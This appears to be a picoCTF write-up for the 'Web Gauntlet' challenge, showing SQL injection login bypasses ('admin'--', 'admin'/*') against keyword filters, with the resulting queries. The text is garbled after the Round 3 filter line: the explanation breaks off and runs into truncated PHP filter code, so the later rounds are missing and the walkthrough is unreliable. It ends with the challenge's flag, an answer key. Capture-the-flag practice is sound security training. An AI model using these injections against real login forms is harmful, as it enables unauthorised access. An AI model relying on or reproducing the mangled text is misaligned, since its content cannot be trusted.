# Web Gauntlet
Category: Web Exploitation
## Description
> Can you beat the filters? Log in as admin 
## Solution
Two links were attached. One contained a simple web form with input fields for a username and password:
```html
Round 1 / 5
        Username
        Password
    Sign in
```
If we try to sign in with a random username and password (e.g. `user:pass`), we get the following as output:
```sql
SELECT * FROM users WHERE username='user' AND password='pass' 
```
The other was called `filter.php` and contained this:
```console
root@kali:/media/sf_CTFs/pico/Web_Gauntlet# curl http://jupiter.challenges.picoctf.org:28955/filter.php
Round1: or
```
So, it seems safe to assume that we need to login to the website using SQL injection without using the keyword in the filter.
To pass the first round, we can use `admin'--` as the username, causing the rest of the clause to be interpreted as a comment:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='pass' 
```
Round 2 introduces the following filter:
```
Round2: or and like = --
```
We'll just try a different comment style. `#` doesn't work but `/*` does, making our input `admin'/*` and our complete clause:
```sql
SELECT * FROM users WHERE username='admin'/*' AND password='pass' 
```
Round 3 has the following filters:
```
Round3: or and = like >   ";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}
// picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
?> 
```
The flag: `picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}`